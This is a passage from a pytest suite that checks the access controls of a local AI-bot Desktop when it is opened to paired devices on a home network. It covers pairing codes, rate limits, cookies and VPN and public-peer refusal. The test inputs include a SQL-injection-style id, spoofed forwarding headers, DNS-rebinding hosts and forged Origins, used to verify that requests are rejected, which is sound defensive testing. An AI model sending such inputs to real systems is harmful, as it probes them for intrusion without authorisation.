"""D130: a paired device on the owner's home network opens the Desktop. The first time the Core is reachable off this computer.

Real routes, and real listeners where a socket is the point. A real listener here binds 127.0.0.2, never every interface
and never this computer's real address: that would open a socket on her real network and can pop a firewall prompt at her.
The peer check and the address lookups are stood in for on the ``Network`` object, or called with faked results. Marked
where a line runs only on Windows or only elsewhere.
"""

from __future__ import annotations

import http.client
import http.server
import json
import os
import re
import shutil
import socket
import subprocess
import threading
import time
from pathlib import Path

import pytest

from conftest import HELLO, manifest_sha
from puffpai_core import cli, pairing
from puffpai_core.api import auth, network
from puffpai_core.api.app import CORE_LISTENER, PAGES_LISTENER, TERMINAL_LABEL, create_app, make_servers, stop_servers
from puffpai_core.api.network import NETWORK_LISTENER, NETWORK_PACKAGE, NETWORK_PAGE_LISTENER
from puffpai_core.registry import row_from_manifest
from puffpai_core.steward.steward import Running

REPO = Path(__file__).resolve().parents[1]
ADDRESS = "192.168.1.5"
PEER = "192.168.1.50"
STAND_IN = "127.0.0.2"                 # a real socket, on no real network
JSON_WRITE = {"Content-Type": "application/json"}


def _free_port(host: str = "127.0.0.1") -> int:
    while True:
        with socket.socket() as s:
            s.bind((host, 0))
            port = s.getsockname()[1]
        if port not in (8420, 8421, 8422) and port < 65000:
            return port


def _refused(host: str, port: int) -> bool:
    with socket.socket() as s:
        s.settimeout(10)              # long: on a busy computer a slow connect must not read as nothing listening
        return s.connect_ex((host, port)) != 0


# -- the device: a browser that keeps only what a browser would --------------------------------------------------------
class Device:
    """A browser on the network, through the app's real routes. Cookies by hand, so each case says what it sends."""

    def __init__(self, app, peer=PEER, host=None):
        self.app, self.peer, self.net = app, peer, app.extensions[network.EXTENSION]
        self.host = host or f"{ADDRESS}:{self.net.port}"
        self.client = app.test_client(use_cookies=False)
        self.cookies: dict[str, str] = {}
        self.second: str | None = None

    @property
    def origin(self):
        return f"http://{self.host}"

    def open(self, method, path, *, cookie=True, second=True, origin=True, headers=None, body=None, environ=None, host=None):
        h = dict(headers or {})
        if cookie and self.cookies:
            h["Cookie"] = "; ".join(f"{k}={v}" for k, v in self.cookies.items())
        if second and self.second:
            h[auth.DEVICE_HEADER] = self.second
        if method not in ("GET", "HEAD") and origin:
            h.setdefault("Origin", self.origin)
            h.setdefault("X-PuffPAI", "1")
        env = {"puffpai.listener": NETWORK_LISTENER, "REMOTE_ADDR": self.peer, **(environ or {})}
        return self.client.open(path, method=method, base_url=f"http://{host or self.host}", headers=h, environ_base=env,
                                json=body)

    def get(self, path, **kw):
        return self.open("GET", path, **kw)

    def pair(self, code, **kw):
        r = self.open("POST", "/v1/pair", body={"code": code}, **kw)
        if r.status_code == 200:
            self.second = r.json["device_key"]
            for line in r.headers.getlist("Set-Cookie"):
                name, _, rest = line.partition("=")
                self.cookies[name] = rest.split(";", 1)[0]
        return r


@pytest.fixture
def net(core):
    n = core.app.extensions[network.EXTENSION]
    n.addresses = lambda: {ADDRESS}
    n.names = lambda: {"mybox", "mybox.local"}
    return n


@pytest.fixture
def on(core, net):
    network.save_on(core.state, True)
    return net


def _paired(core, peer=PEER, host=None):
    d = Device(core.app, peer, host)
    assert d.pair(pairing.new_code(core.state)).status_code == 200
    return d


def local(token):
    return {"Authorization": f"Bearer {token}"}


@pytest.fixture(autouse=True)
def _no_given_addresses(monkeypatch):
    """Her shell or a container may set it. Only the cases that say so run with it."""
    monkeypatch.delenv(network.ADDRESSES_ENV, raising=False)


# -- off by default ----------------------------------------------------------------------------------------------------
def test_the_default_is_on_in_one_named_place():
    """The one line in these tests that says what the default is (the owner's decision). Every other test saves the
    choice it needs, or sets the default itself."""
    assert network.DEFAULT_ON is True


def test_a_fresh_bot_listens_from_its_first_start_and_turns_strangers_away(core, net, monkeypatch):
    from puffpai_core.api.app import start_core, stop_core
    monkeypatch.setattr(network, "DEFAULT_ON", True)
    net.bind_host, net.port = STAND_IN, _free_port(STAND_IN)
    net.addresses, net.names, net.peer_ok = (lambda: {STAND_IN}), (lambda: set()), (lambda a: True)
    assert not (core.state / "settings" / "network.json").exists()
    terminal = start_core(core.app)
    try:
        assert net.is_open() is True
        c = http.client.HTTPConnection(STAND_IN, net.port, timeout=10)
        c.request("GET", "/v1/settings")
        r = c.getresponse()
        assert r.status == 401 and b"sign_in" in r.read()
        c.request("GET", "/")
        r = c.getresponse()
        r.read()
        assert r.status == 302 and r.getheader("Location").endswith("/pair")
    finally:
        stop_core(core, terminal)
    assert _refused(STAND_IN, net.port)


def test_a_port_that_cant_bind_never_stops_the_core(core, net, monkeypatch, capsys):
    """Another program on the port, or anything else going wrong: the Core starts, says so, and 127.0.0.1 carries on."""
    from puffpai_core.api.app import start_core, stop_core
    monkeypatch.setattr(network, "DEFAULT_ON", True)
    net.bind_host, net.port = STAND_IN, _free_port(STAND_IN)
    key = core.tokens.issue_owner_key()
    with socket.socket() as other:
        other.bind((STAND_IN, net.port))
        other.listen(1)
        terminal = start_core(core.app)
        try:
            out = capsys.readouterr().out
            assert "Another program" in out and str(net.port) in out and "This computer still can" in out
            assert net.is_open() is False and "Another program" in net.view()["line"]
            assert core.app.test_client().get("/v1/settings", headers=local(key)).status_code == 200
        finally:
            stop_core(core, terminal)
    core.app.extensions.pop("puffpai.started", None)
    monkeypatch.setattr(net, "open", lambda: 1 / 0)
    terminal = start_core(core.app)
    try:
        assert "could not listen" in capsys.readouterr().out
        assert core.app.test_client().get("/v1/settings", headers=local(key)).status_code == 200
    finally:
        stop_core(core, terminal)


def test_a_saved_choice_wins_over_the_default_either_way(tmp_path, monkeypatch):
    for default in (False, True):
        monkeypatch.setattr(network, "DEFAULT_ON", default)
        state = tmp_path / str(default)
        assert network.saved_on(state) is default                  # no choice saved: the default
        network.save_on(state, not default)
        assert network.saved_on(state) is (not default)            # her choice wins
        network.save_on(state, default)
        assert network.saved_on(state) is default
        pages_only = tmp_path / f"{default}-pages"
        (pages_only / "settings").mkdir(parents=True)
        (pages_only / "settings" / "network.json").write_text('{"pages": {"made-app": 19100}}', encoding="utf-8")
        assert network.saved_on(pages_only) is default             # a saved page port is no choice


def test_a_core_with_no_saved_choice_follows_the_default(core, net, monkeypatch):
    monkeypatch.setattr(network, "DEFAULT_ON", True)
    net.accepting, net.bind_host, net.port = True, STAND_IN, _free_port(STAND_IN)
    try:
        assert net.open() is True and not _refused(STAND_IN, net.port)
    finally:
        net.close()
    monkeypatch.setattr(network, "DEFAULT_ON", False)
    assert net.open() is False and _refused(STAND_IN, net.port)


def test_a_real_core_binds_every_interface_and_a_test_never_does(tmp_path, monkeypatch):
    """A test's Core stays on the stand-in, in any process it starts. Nothing binds here: this only reads where it would."""
    assert os.environ[network.BIND_ENV] == STAND_IN
    assert not network.BIND_ENV.startswith(("PUFFPAI_", "PYTEST"))     # tests take those out for the Cores they start
    assert create_app(tmp_path / "t").extensions[network.EXTENSION].bind_host == STAND_IN
    monkeypatch.delenv(network.BIND_ENV)
    assert create_app(tmp_path / "r").extensions[network.EXTENSION].bind_host == "0.0.0.0"


def test_no_socket_and_no_route_when_off(core, net):
    network.save_on(core.state, False)
    net.accepting, net.bind_host, net.port = True, STAND_IN, _free_port(STAND_IN)
    assert net.open() is False and net.is_open() is False
    assert _refused(STAND_IN, net.port)
    d = Device(core.app)
    for path in ("/", "/pair", "/v1/health", "/v1/settings"):        # a stamp alone (no socket) still gets nothing
        assert d.get(path).status_code == 403
    assert d.open("POST", "/v1/pair", body={"code": "x"}).status_code == 403


def test_a_broken_settings_file_counts_as_off_whatever_the_default(core, net, monkeypatch):
    monkeypatch.setattr(network, "DEFAULT_ON", True)
    path = core.state / "settings" / "network.json"
    path.parent.mkdir(parents=True, exist_ok=True)
    for text in ("{not json", '["on"]', '{"on": "true"}', '{"on": 1}'):
        path.write_text(text, encoding="utf-8")
        assert network.saved_on(core.state) is False, text


def test_on_and_off_at_once_and_it_stays_on_across_a_restart(core, net, state):
    network.save_on(core.state, False)
    net.accepting, net.bind_host, net.port = True, STAND_IN, _free_port(STAND_IN)
    net.addresses, net.names, net.peer_ok = (lambda: {STAND_IN}), (lambda: set()), (lambda a: True)
    terminal = core.tokens.issue_device(f"{TERMINAL_LABEL} (run t)")
    core.terminal_label = f"{TERMINAL_LABEL} (run t)"
    c = core.app.test_client()
    try:
        r = c.put("/v1/network", json={"on": True}, headers=local(terminal))
        assert r.status_code == 200 and r.json["on"] is True and r.json["open"] is True
        assert "use a network you trust" in r.json["worth_knowing"]
        assert not _refused(STAND_IN, net.port)
        assert network.saved_on(core.state) is True
        # a new Core for this bot reads it from the bot's folder
        again = create_app(core.state, port=18419)
        assert network.saved_on(again.extensions["puffpai"].state) is True
        r = c.put("/v1/network", json={"on": False}, headers=local(terminal))
        assert r.status_code == 200 and r.json["on"] is False and r.json["open"] is False
        assert _refused(STAND_IN, net.port)                       # no socket: nothing listens
        assert network.saved_on(core.state) is False
        for bad in ({"on": "yes"}, {}, {"on": True, "more": 1}, []):
            assert c.put("/v1/network", json=bad, headers=local(terminal)).status_code == 400
    finally:
        net.close()


def test_a_program_or_a_stranger_never_turns_it_on_or_off(core, on):
    network.save_on(core.state, False)
    c = core.app.test_client()
    for token in (core.tokens.issue_owner_key(), core.tokens.issue_package_token("some-app"), core.tokens.issue_toolsmith("b1")):
        for method, path, body in (("PUT", "/v1/network", {"on": True}), ("POST", "/v1/network/code", None)):
            assert c.open(path, method=method, json=body, headers=local(token)).status_code == 403
    assert c.put("/v1/network", json={"on": True}).status_code == 401
    assert network.saved_on(core.state) is False
    network.save_on(core.state, True)
    stranger, friend = Device(core.app), _paired(core)
    assert stranger.open("PUT", "/v1/network", body={"on": False}).status_code == 401
    assert friend.open("PUT", "/v1/network", body={"on": False}, second=False).status_code == 401
    assert network.saved_on(core.state) is True
    r = friend.open("POST", "/v1/network/code")                # any paired device can let another in, as in v1
    assert r.status_code == 200 and Device(core.app, peer="192.168.1.71").pair(r.json["code"]).status_code == 200


def test_a_port_in_use_is_one_plain_line_not_a_crash(core, on):
    on.bind_host, on.port, on.accepting = STAND_IN, _free_port(STAND_IN), True
    with socket.socket() as other:
        other.bind((STAND_IN, on.port))
        other.listen(1)
        assert on.open() is False
        assert str(on.port) in on.why and "Another program" in on.why
        assert on.view()["line"] == on.why


def test_safe_mode_leaves_the_network_open_and_the_routes_keep_their_own_answers(core, on, monkeypatch):
    """Never a dead end: a bot with no screen in safe mode is still reached from a paired device, and strangers still aren't."""
    on.accepting, on.bind_host, on.port = True, STAND_IN, _free_port(STAND_IN)
    d = _paired(core)
    monkeypatch.setattr(type(core.caretaker), "in_safe_mode", property(lambda self: True))
    try:
        assert on.open() is True
    finally:
        on.close()
    assert d.get("/v1/settings").status_code == 200
    r = d.open("POST", "/v1/dev/shell", body={"shell": "cmd"})
    assert r.status_code == 409 and r.json["code"] == "safe_mode"
    assert d.open("POST", "/v1/terminal/open", body={}).json["url"] == "/#developer/terminal"
    assert Device(core.app, peer="192.168.1.70").get("/v1/settings").status_code == 401


def test_the_core_start_opens_only_what_she_saved(core, net, monkeypatch):
    """``start_core`` and ``stop_core``'s piece: nothing when off, one socket when on, gone at the stop."""
    net.bind_host, net.port = STAND_IN, _free_port(STAND_IN)
    net.addresses, net.names, net.peer_ok = (lambda: {STAND_IN}), (lambda: set()), (lambda a: True)
    from puffpai_core.api.app import start_core, stop_core
    network.save_on(core.state, False)
    terminal = start_core(core.app)
    try:
        assert net.accepting is True and net.is_open() is False and _refused(STAND_IN, net.port)
    finally:
        stop_core(core, terminal)
    assert net.accepting is False
    network.save_on(core.state, True)
    core.app.extensions.pop("puffpai.started", None)
    terminal = start_core(core.app)
    try:
        assert net.is_open() is True and not _refused(STAND_IN, net.port)
    finally:
        stop_core(core, terminal)
    assert net.is_open() is False and _refused(STAND_IN, net.port)


# -- an unpaired device ------------------------------------------------------------------------------------------------
def test_an_unpaired_device_gets_the_pair_screen_and_no_data(core, on):
    d = Device(core.app)
    r = d.get("/")
    assert r.status_code == 302 and r.headers["Location"].endswith("/pair")
    r = d.get("/pair")
    text = r.get_data(as_text=True)
    assert r.status_code == 200 and "Pair this device" in text and "use a network you trust" in text
    assert "frame-ancestors 'none'" in r.headers["Content-Security-Policy"]
    assert str(core.state) not in text and "Set-Cookie" not in r.headers
    for path in ("/v1/settings", "/v1/registry", "/v1/health", "/v1/core", "/v1/vault/status", "/v1/chat/history", "/v1/events",
                 "/v1/recover", "/v1/network", "/v1/devices", "/ui/logic.js", "/ui/index.html"):
        r = d.get(path)
        assert r.status_code == 401 and r.json["code"] == "sign_in", path
    r = d.get("/v1/signin")                 # names no folder and no command
    assert r.status_code == 200 and r.json == {"file": "", "folder": "", "pair": "/pair"}
    r = d.get("/window/")
    assert r.status_code == 302 and r.headers["Location"].endswith("/pair?back=window")
    assert d.get("/window/window.js").status_code == 401


def test_the_pair_screen_says_which_computer_is_which_in_steps_that_match_the_tile(core, on):
    text = Device(core.app).get("/pair").get_data(as_text=True)
    assert text.index("Go to the computer BuildBot runs on.") < text.index("Show a pairing code") < text.index("Type the code here.")
    assert "If that computer has no screen, ask whoever set it up to run: <b>puffpai pair</b>" in text
    # The button and row it names are the Settings tile's own words, and the rail really says Settings.
    web = REPO / "packages" / "desktop" / "web"
    tile = (web / "pages" / "settings.js").read_text(encoding="utf-8")
    assert 'text: "Show a pairing code"' in tile and 'row("network", "Your home network")' in tile
    assert "Open Settings, then Your home network, and press Show a pairing code." in text
    assert 'title: "Settings"' in tile
    # It reaches unpaired devices: the name she gave her bot never shows on it.
    from puffpai_core import bot
    bot.save(core.state, name="Secret Name", by="owner", registry=core.registry)
    assert "Secret Name" not in Device(core.app).get("/pair").get_data(as_text=True)


def test_her_screen_never_says_tls_or_the_old_words(core, on):
    for word in ("TLS", "gadget", "on the wire"):
        assert word not in network.WORTH_KNOWING, word
    assert "Anyone on your Wi-Fi who can watch traffic could see what you type here, so use a network you trust." in network.WORTH_KNOWING
    assert "command line" in network.WORTH_KNOWING and "act as this device" in network.WORTH_KNOWING
    for word in ("no TLS", "gadget"):
        assert word not in Device(core.app).get("/pair").get_data(as_text=True), word


def test_a_wrong_code_is_limited_and_a_guest_cant_keep_trying(core, on):
    good = pairing.new_code(core.state)
    d = Device(core.app)
    for _ in range(network.PairLimit.PER_PEER):
        r = d.pair("WRON-GWRO-NGXX")
        assert r.status_code == 401 and r.json["code"] == "pair_code"
    r = d.pair(good)                         # limited: even the right code waits, and is not used up
    assert r.status_code == 429 and r.json["code"] == "pair_wait"
    assert "device_key" not in r.json
    other = Device(core.app, peer="192.168.1.51")      # by the socket's own peer, so another device still pairs
    assert other.pair(good).status_code == 200


def test_the_limit_reads_the_socket_peer_never_a_header(core, on):
    d = Device(core.app)
    for i in range(network.PairLimit.PER_PEER):
        d.pair("WRON-GWRO-NGXX", headers={"X-Forwarded-For": f"192.168.1.{100 + i}", "X-Real-IP": f"192.168.1.{100 + i}"})
    assert d.pair("WRON-GWRO-NGXX", headers={"X-Forwarded-For": "192.168.1.200"}).status_code == 429


def test_the_limit_counts_all_devices_together_and_forgets_in_time():
    limit = network.PairLimit()
    for i in range(network.PairLimit.IN_ALL):
        assert limit.take(f"192.168.1.{i}", now=100.0) is True
    assert limit.take("192.168.2.2", now=100.0) is False
    assert limit.take("192.168.2.2", now=100.0 + network.PairLimit.WINDOW_S + 1) is True


def test_a_used_or_old_code_fails(core, on):
    d = Device(core.app)
    code = pairing.new_code(core.state)
    assert d.pair(code).status_code == 200
    assert Device(core.app, peer="192.168.1.51").pair(code).status_code == 401      # one use
    old = pairing.new_code(core.state, now=time.time() - pairing.LIFETIME_S - 1)
    assert Device(core.app, peer="192.168.1.52").pair(old).status_code == 401       # older than 10 minutes
    code = pairing.new_code(core.state)
    assert len(code.replace("-", "")) == 12 and pairing.LIFETIME_S == 600


def test_a_right_code_pairs_and_only_both_halves_count(core, on):
    d = Device(core.app)
    r = d.pair(pairing.new_code(core.state))
    assert r.status_code == 200 and r.headers["Cache-Control"] == "no-store"
    line = r.headers["Set-Cookie"]
    assert line.startswith(f"puffpai_device_{on.port}=")
    assert "HttpOnly" in line and "SameSite=Strict" in line and "Domain" not in line and "Secure" not in line
    assert d.second not in line and d.second.startswith("ppb_")
    assert d.get("/v1/settings").status_code == 200
    assert d.open("PUT", "/v1/people", body=[]).status_code == 200
    # a cookie without its half is no cookie, a half without its cookie is nothing, on a read and on a one-tap Yes
    for kw in ({"second": False}, {"cookie": False}):
        assert d.get("/v1/settings", **kw).status_code == 401, kw
        assert d.open("POST", "/v1/consent/nope/answer", body={"answer": "yes", "factor": "tap"}, **kw).status_code == 401, kw
    # the wrong half, and a half from another device
    other = _paired(core, peer="192.168.1.51")
    assert d.get("/v1/settings", second=False, headers={auth.DEVICE_HEADER: other.second}).status_code == 401
    assert d.get("/v1/settings", second=False, headers={auth.DEVICE_HEADER: "ppb_wrong"}).status_code == 401
    # a page load can't send the second half: the Desktop's files need the cookie alone, and they hold no data
    assert d.get("/", second=False).status_code == 200
    assert d.get("/ui/logic.js", second=False).status_code == 200
    assert d.get("/", cookie=False).status_code == 302


def test_a_device_paired_on_the_network_is_an_ordinary_device_and_it_is_listed(core, on):
    d = _paired(core)
    other = _paired(core, peer="192.168.1.51")
    rows = d.get("/v1/devices").json["devices"]
    assert len(rows) == 2 and sum(1 for x in rows if x["this"]) == 1
    assert all(set(x) == {"id", "label", "created_at", "this"} for x in rows)
    assert not any(auth.BROWSER_LABEL in x["label"] for x in rows)
    # on this computer too, and the terminal's key is no browser, so it is not listed
    key = core.tokens.issue_device(f"{TERMINAL_LABEL} (run t)")
    core.terminal_label = f"{TERMINAL_LABEL} (run t)"
    assert len(core.app.test_client().get("/v1/devices", headers=local(key)).json["devices"]) == 2
    assert other.get("/v1/settings").status_code == 200


def test_a_removed_device_stops_on_its_next_request(core, on):
    d, other = _paired(core), _paired(core, peer="192.168.1.51")
    assert d.get("/v1/settings").status_code == 200
    mine = next(x["id"] for x in d.get("/v1/devices").json["devices"] if x["this"])
    r = other.open("DELETE", f"/v1/devices/{mine}")          # as in v1: lost the phone? from any other paired device
    assert r.status_code == 200 and r.json["removed"] == mine
    assert d.get("/v1/settings").status_code == 401
    assert d.get("/", second=False).status_code == 302       # the pair screen again
    assert other.open("DELETE", f"/v1/devices/{mine}").status_code == 404
    assert other.open("DELETE", "/v1/devices/" + "%27%20OR%201=1--").status_code == 404
    assert len(other.get("/v1/devices").json["devices"]) == 1


# -- who may not ------------------------------------------------------------------------------------------------------
def test_owner_key_package_and_toolsmith_tokens_and_the_terminal_key_are_refused(core, on):
    terminal = core.tokens.issue_device(f"{TERMINAL_LABEL} (run t)")
    core.terminal_label = f"{TERMINAL_LABEL} (run t)"
    plain_device = core.tokens.issue_device("a program's device key")
    keys = {"owner": core.tokens.issue_owner_key(), "package": core.tokens.issue_package_token("some-app"),
            "toolsmith": core.tokens.issue_toolsmith("b1"), "terminal": terminal, "device": plain_device}
    d = Device(core.app)
    name = network.cookie_name(on.port)
    for who, key in keys.items():
        for path in ("/v1/settings", "/v1/registry", "/v1/health", "/v1/toolsmith/agent/build", "/v1/theme"):
            for headers in ({"Authorization": f"Bearer {key}"}, {"X-PuffPAI-Key": key}):
                r = d.get(path, headers=headers)
                assert r.status_code == 403 and "paired browser" in r.json["error"], (who, path)
            r = d.get(path, headers={"Cookie": f"{name}={key}"})      # a program's key as the cookie: no cookie
            assert r.status_code == 401, (who, path)
        assert d.get("/", headers={"Cookie": f"{name}={key}"}).status_code == 302, who
    # A browser's own token as a bearer, with its second half: the network takes the cookie only.
    friend = _paired(core)
    token = friend.cookies[name]
    r = friend.get("/v1/settings", cookie=False, headers={"Authorization": f"Bearer {token}"})
    assert r.status_code == 403


def test_a_vpn_address_is_turned_away_in_plain_words(core, on):
    """A Tailscale address (100.64.0.0/10) is no way in, from either end. D130 keeps it so; this pins it."""
    # A device on the VPN, whatever address it asks for: the socket's peer decides.
    for host in (f"{ADDRESS}:{on.port}", f"100.100.1.1:{on.port}"):
        r = Device(core.app, peer="100.100.2.2", host=host).get("/pair")
        text = r.get_data(as_text=True)
        assert r.status_code == 403 and r.mimetype == "text/plain"
        assert "VPN" in text and "turned away" in text and "{" not in text
    # A home device that asks for the bot's own VPN address: it is not one of the bot's addresses (a real lookup finds
    # it and drops it), so it answers as for any wrong name.
    on.addresses = lambda: network.own_addresses(named=lambda: ["100.100.1.1", ADDRESS], interfaces=lambda: [], route=lambda: [])
    on._looked, on._known = float("-inf"), (float("-inf"), set(), set())
    r = Device(core.app).get("/pair", host=f"100.100.1.1:{on.port}")
    text = r.get_data(as_text=True)
    assert r.status_code == 421 and r.mimetype == "text/plain" and "VPN" in text and "{" not in text
    assert Device(core.app).get("/pair").status_code == 200       # the same computer's home address still answers
    assert "100.100.1.1" not in json.dumps(on.view()["urls"])     # and no VPN address is offered to type


def test_a_public_peer_is_refused_whatever_it_says(core, on):
    for peer in ("8.8.8.8", "1.1.1.1", "2001:4860:4860::8888", "100.64.0.1", "127.0.0.1", "::1", "", "nonsense", "224.0.0.1", "0.0.0.0"):
        d = Device(core.app, peer=peer)
        r = d.get("/pair", headers={"X-Forwarded-For": PEER, "X-Real-IP": PEER, "Forwarded": f"for={PEER}"})
        assert r.status_code == 403 and "home network" in r.get_data(as_text=True), peer
        assert d.pair(pairing.new_code(core.state)).status_code == 403, peer
    for peer in ("192.168.1.9", "10.1.2.3", "172.16.0.9", "169.254.10.10", "fe80::1", "fe80::1%eth0", "fd00::1", "::ffff:192.168.1.9"):
        assert Device(core.app, peer=peer).get("/pair").status_code == 200, peer


def test_the_real_socket_peer_decides(core, on):
    """A real listener, the real peer check: 127.0.0.1 is no home network, and a header does not change that."""
    on.bind_host, on.port, on.accepting = STAND_IN, _free_port(STAND_IN), True
    on.addresses = lambda: {STAND_IN}
    assert on.open() is True
    try:
        c = http.client.HTTPConnection(STAND_IN, on.port, timeout=10)
        c.request("GET", "/pair", headers={"X-Forwarded-For": PEER, "X-Real-IP": PEER, "Forwarded": f"for={PEER}"})
        r = c.getresponse()
        assert r.status == 403 and b"home network" in r.read()
    finally:
        on.close()


def test_a_wrong_host_is_refused_dns_rebinding(core, on):
    d = Device(core.app)
    for host in ("evil.example:%d", "puffpai.localhost:%d", "localhost:%d", "127.0.0.1:%d", "192.168.1.6:%d", "8.8.8.8:%d",
                 "app.localhost:%d", "mybox.evil.example:%d", "mybox.local.evil.example:%d", "[::1]:%d"):
        r = d.get("/pair", host=host % on.port)
        assert r.status_code == 421, host
    assert d.get("/pair", host=f"{ADDRESS}:{on.port + 1}").status_code == 421
    assert d.client.get("/pair", headers={"Host": ADDRESS}, environ_base={"puffpai.listener": NETWORK_LISTENER,
                                                                          "REMOTE_ADDR": PEER}).status_code == 421
    for host in (ADDRESS, "mybox", "mybox.local", "MyBox.Local"):
        assert d.get("/pair", host=f"{host}:{on.port}").status_code == 200, host


def test_addresses_are_read_again_when_the_network_changes(core, on):
    d = Device(core.app)
    assert d.get("/pair").status_code == 200
    on.addresses = lambda: {"192.168.1.77"}
    on._looked = float("-inf")                      # the lookup waits a few seconds between misses
    assert d.get("/pair", host=f"192.168.1.77:{on.port}").status_code == 200      # DHCP gave it a new address
    assert d.get("/pair").status_code == 421                                       # and the old one is no longer its own


def test_a_miss_looks_again_only_now_and_then(core, on):
    looks = []
    on.addresses = lambda: looks.append(1) or {ADDRESS}
    d = Device(core.app)
    for i in range(20):
        d.get("/pair", host=f"evil{i}.example:{on.port}")
    assert len(looks) <= 1


def test_a_wrong_origin_is_refused_on_writes(core, on):
    d = _paired(core)
    for headers in ({"Origin": "http://evil.example", "X-PuffPAI": "1"},
                    {"Origin": f"http://{ADDRESS}:19100", "X-PuffPAI": "1"},       # a package page on another port
                    {"Origin": f"http://mybox.local:{on.port}", "X-PuffPAI": "1"},  # this computer, another name: another origin
                    {"Origin": f"http://puffpai.localhost:{on.port}", "X-PuffPAI": "1"},
                    {"Origin": "http://puffpai.localhost:18419", "X-PuffPAI": "1"},
                    {"Origin": "null", "X-PuffPAI": "1"}, {"Origin": d.origin, "X-PuffPAI": "0"},
                    {"Sec-Fetch-Site": "same-site", "X-PuffPAI": "1"}):
        r = d.open("PUT", "/v1/people", body=[], origin=False, headers=headers)
        assert r.status_code == 403, headers
        assert "did not come from the Desktop" in r.json["error"]
    assert d.open("PUT", "/v1/people", body=[], origin=False, headers={"Sec-Fetch-Site": "same-origin", "X-PuffPAI": "1"}).status_code == 200
    # The origin the device really uses counts, on its name too
    named = _paired(core, host=f"mybox.local:{on.port}")
    assert named.open("PUT", "/v1/people", body=[]).status_code == 200
    # Pairing too: a page elsewhere can't pair this browser, and the code is not used
    code = pairing.new_code(core.state)
    s = Device(core.app, peer="192.168.1.60")
    assert s.pair(code, origin=False, headers={"Origin": "http://evil.example", "X-PuffPAI": "1"}).status_code == 403
    assert s.pair(code, origin=False, headers={"Origin": s.origin}).status_code == 403
    assert s.pair(code).status_code == 200


# -- on this computer, nothing changed ---------------------------------------------------------------------------------
def test_the_local_listeners_are_as_they_were(core, on):
    from desktop_kit import desktop_client
    port = core.port
    c = core.app.test_client(use_cookies=False)
    stamp = {"puffpai.listener": CORE_LISTENER}
    code = pairing.new_code(core.state)
    r = c.post("/v1/pair", json={"code": code}, base_url=f"http://127.0.0.1:{port}", environ_base=stamp)
    assert r.status_code == 403                          # D79: not on 127.0.0.1, and the code is not used
    r = c.get("/", base_url=f"http://127.0.0.1:{port}", environ_base=stamp)
    assert r.status_code == 302 and f"puffpai.localhost:{port}" in r.headers["Location"]
    assert c.get("/v1/health", base_url=f"http://192.168.1.5:{port}", environ_base=stamp).status_code == 421
    assert c.get("/pair", base_url=f"http://puffpai.localhost:{port}", environ_base=stamp).status_code == 404
    assert c.get("/pair", base_url=f"http://127.0.0.1:{core.pages_port}", environ_base={"puffpai.listener": PAGES_LISTENER}).status_code == 404
    desk = desktop_client(core.app, port)
    r = desk.post("/v1/pair", json={"code": code}, base_url=f"http://puffpai.localhost:{port}")
    assert r.status_code == 200
    line = r.headers["Set-Cookie"]
    assert line.startswith(auth.cookie_name(port) + "=") and "Domain" not in line
    # A bearer on 127.0.0.1 is untouched; the pages address is too.
    key = core.tokens.issue_owner_key()
    assert c.get("/v1/settings", base_url=f"http://127.0.0.1:{port}", environ_base=stamp, headers=local(key)).json["pages"].startswith("http://127.0.0.1:")
    assert "network" not in c.get("/v1/settings", base_url=f"http://127.0.0.1:{port}", environ_base=stamp, headers=local(key)).json
    r = c.get("/v1/network/pages", headers=local(core.tokens.issue_device("x")))
    assert r.status_code == 404


def test_the_two_logins_never_stand_in_for_each_other(core, on):
    from desktop_kit import desktop_client
    port = core.port
    desk = desktop_client(core.app, port)
    r = desk.post("/v1/pair", json={"code": pairing.new_code(core.state)}, base_url=f"http://puffpai.localhost:{port}")
    second = r.json["device_key"]
    value = r.headers["Set-Cookie"].split(";", 1)[0].split("=", 1)[1]
    d = Device(core.app)
    r = d.get("/v1/settings", headers={"Cookie": f"{auth.cookie_name(port)}={value}", auth.DEVICE_HEADER: second})
    assert r.status_code == 401                          # the local cookie's name counts for nothing on the network
    net_device = _paired(core)
    net_value = net_device.cookies[network.cookie_name(on.port)]
    c = core.app.test_client(use_cookies=False)
    r = c.get("/v1/settings", base_url=f"http://puffpai.localhost:{port}",
              headers={"Cookie": f"{network.cookie_name(on.port)}={net_value}", auth.DEVICE_HEADER: net_device.second})
    assert r.status_code == 401                          # and the network's counts for nothing here


# -- a paired device gets everything; everyone else nothing -------------------------------------------------------------
def _url(rule) -> str:
    return re.sub(r"<[^>]+>", "x", rule.rule)


def _routes(core):
    for rule in core.app.url_map.iter_rules():
        if rule.endpoint == "static":
            continue
        for method in sorted(rule.methods - {"HEAD", "OPTIONS"}):
            yield rule, method


OPEN_TO_ANYONE = {"ui.ui_pair_screen": 200, "ui.ui_signin": 200, "ui.ui_root": 302, "ui.window_root": 302}


def test_no_route_answers_an_unpaired_device_or_a_programs_key(core, on):
    """The boundary, on every route there is, so a new route can't miss it."""
    keys = [core.tokens.issue_owner_key(), core.tokens.issue_package_token("some-app"), core.tokens.issue_toolsmith("b1")]
    stranger = Device(core.app)
    for rule, method in _routes(core):
        r = stranger.open(method, _url(rule), body={} if method != "GET" else None)
        if rule.endpoint in OPEN_TO_ANYONE:
            assert r.status_code == OPEN_TO_ANYONE[rule.endpoint], rule.rule
        elif rule.endpoint == "ui.ui_pair":
            assert r.status_code == 401 and r.json["code"] == "pair_code"
        elif rule.endpoint.startswith("pages."):
            assert r.status_code == 404, rule.rule
        else:
            assert r.status_code == 401, (method, rule.rule, r.status_code)
        if rule.endpoint in OPEN_TO_ANYONE or rule.endpoint == "ui.ui_pair" or rule.endpoint.startswith("pages."):
            continue
        for key in keys:
            r = stranger.open(method, _url(rule), body={} if method != "GET" else None, headers=local(key))
            assert r.status_code == 403 and r.json["error"] == network.KEYS_REFUSED, (method, rule.rule)


def test_there_is_no_list_of_routes_kept_from_a_paired_device(core, on):
    """Only Toolsmith's own and the Core's own routes refuse a paired browser, as they refuse the owner on this computer."""
    assert not hasattr(network, "THIS_COMPUTER") and not hasattr(network, "YES_ON_THIS_COMPUTER")
    d = _paired(core)
    for rule, method in _routes(core):
        access = getattr(core.app.view_functions[rule.endpoint], "puffpai_access")
        if access in ("toolsmith", "core"):
            assert d.open(method, _url(rule), body={} if method != "GET" else None).status_code == 403, rule.rule


@pytest.mark.parametrize("method,path,body", [
    ("POST", "/v1/window/open", None), ("POST", "/v1/terminal/open", {}),
    ("POST", "/v1/dev/shell", {"shell": "no-such-shell"}), ("GET", "/v1/dev/shell", None), ("POST", "/v1/dev/shell/x/input", {"text": "x"}),
    ("DELETE", "/v1/dev/shell/x", None),
